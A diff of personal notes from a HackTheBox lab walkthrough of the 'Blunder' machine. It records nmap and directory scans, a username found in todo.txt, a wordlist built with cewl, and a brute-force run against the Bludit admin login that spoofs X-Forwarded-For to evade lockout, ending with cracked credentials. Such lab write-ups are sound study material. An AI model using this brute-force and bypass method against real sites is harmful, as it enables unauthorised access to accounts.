@@ -1,10 +1,10 @@
 Machine-Name  :  Blunder
-IP-Address    :  10.129.80.58
+IP-Address    :  10.129.115.113
 
-Command-Line: sudo nmap -A nmap/access 10.129.80.58
+Command-Line: sudo nmap -A nmap/access 10.129.115.113
 Result:
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 01:28 EST
-    Nmap scan report for 10.129.80.58
+    Nmap scan report for 10.129.115.113
     Host is up (0.055s latency).
     Not shown: 998 filtered ports
     PORT   STATE  SERVICE VERSION
@@ -20,15 +20,15 @@ Result:
     TRACEROUTE (using port 21/tcp)
     HOP RTT      ADDRESS
     1   56.41 ms 10.10.14.1
-    2   54.09 ms 10.129.80.58
+    2   54.09 ms 10.129.115.113
 
     OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 19.36 seconds
 
 
-Browser: http://10.129.80.58
+Browser: http://10.129.115.113
 Command-Line: sudo nano /etc/hosts
-Appended-To-File: 10.129.80.58   blunder.htb
+Appended-To-File: 10.129.115.113   blunder.htb
 
 Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -f -t 20 -i 200,301,302 -u http://blunder.htb
 Result:
@@ -57,7 +57,7 @@ Result:
     Allow: /
 
 
-Browser: http://10.129.80.58/todo.txt
+Browser: http://10.129.115.113/todo.txt
     Result:
     -Update the CMS
     -Turn off FTP - DONE
@@ -67,20 +67,25 @@ Browser: http://10.129.80.58/todo.txt
 
 Possible username: fergus
 
-Notes: Found Bludit login @ http://10.129.80.58/admin/ and http://10.129.80.58/admin/login
+Notes: Found Bludit login @ http://10.129.115.113/admin/ and http://10.129.115.113/admin/login
 
 Browser-Search: Bludit exploit Rastating.
 URL: https://rastating.github.io/bludit-brute-force-mitigation-bypass/
 
-Notes: Need to add "X-FORWARDED-FOR: 127.0.0.1" to header. Placing the X-FORWARDED-FOR header to bypass brute force protection.
+Notes: Need to add "X-FORWARDED-FOR: 127.0.0.1" to header. Placing the X-FORWARDED-FOR vulnerability header to bypass brute force protection.
 
-Command-Line: wget -w blunder-wordlist.txt http://blunder.htb
+Notes: Creating a wordlist from the content found on blunder.htb
+Command-Line: cewl -w blunder-wordlist.txt http://blunder.htb
 Result: /blunder-wordlist.txt
 
-Notes: Created a python3 (bludit_admin.py) script to crack the admin password using the blunder-wordlist.txt file and the admin username(fergus).
-Command-Line: python3 bludit_admin.txt
+Notes: Created a python3 (bludit_brute_force.py) script to crack the admin password using the blunder-wordlist.txt file and the admin username(fergus).
+Command-Line: python3 bludit_brute_force.py http://blunder.htb/admin/login fergus
 Result:
-    CSRF Error...fergus:RolandDeschain
+    1.) fergus:RolandDeschain STATUS-CODE: 301
+Notes: All other attempts resulted in 200 OK.
 
-Notes: Used username(fergus) and password(RolandDeschain) to login to 10.129.80.58/admin/login
+Notes: Used username(fergus) and password(RolandDeschain) to login to 10.129.115.113/admin/login
     *** SUCCESSFUL LOGIN ***
+
+    *** MACHINE IS ACTING BUGGY ***
+    *** NOT FINISHED ***
